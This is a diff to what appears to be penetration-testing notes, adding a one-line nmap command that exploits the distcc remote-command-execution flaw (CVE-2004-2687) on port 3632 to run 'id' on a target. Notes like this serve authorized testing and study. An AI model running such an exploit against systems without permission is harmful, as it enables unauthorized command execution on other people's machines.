@@ -8,6 +8,12 @@
 
 ## Enumeration
 
+### Quick Check (One-liner)
+
+```shell
+nmap -p 3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'" $rhost
+```
+
 ### Nmap
 
 ```shell
